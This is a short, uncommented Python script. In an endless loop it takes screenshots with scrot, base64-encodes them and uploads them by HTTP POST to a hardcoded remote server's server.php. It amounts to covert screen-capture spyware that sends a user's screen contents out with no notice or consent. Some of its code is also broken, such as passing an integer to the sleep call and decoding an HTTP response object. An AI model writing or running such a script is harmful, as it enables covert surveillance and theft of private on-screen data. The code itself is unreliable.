import subprocess
import http.client as http
import base64
import json

time = 5
serverip = '192.168.17.88'
localip = subprocess.check_output(['hostname', '-I']).decode()
localip = localip[:len(localip)-2]
serverfile = 'server.php'
headers = {'Content-type': 'application/json'}

while True:
    screen_png = 'screen.png'
    subprocess.run(['scrot', screen_png])
    subprocess.run(['sleep', time])
    with open(screen_png, 'rb') as screen:
        img = screen.read()
        img_64 = base64.b64encode(img)
        img_64_str = img_64.decode("utf-8")
        img_obj = {
            'file': img_64_str,
            'name': screen_png,
        }
        img_json = json.dumps(img_obj)
        conn = http.HTTPConnection("{0}:80".format(serverip))
        conn.request('POST', '/{}'.format(serverfile), img_json, headers)
        resp = conn.getresponse().decode()
        conn.close()
        print('boy')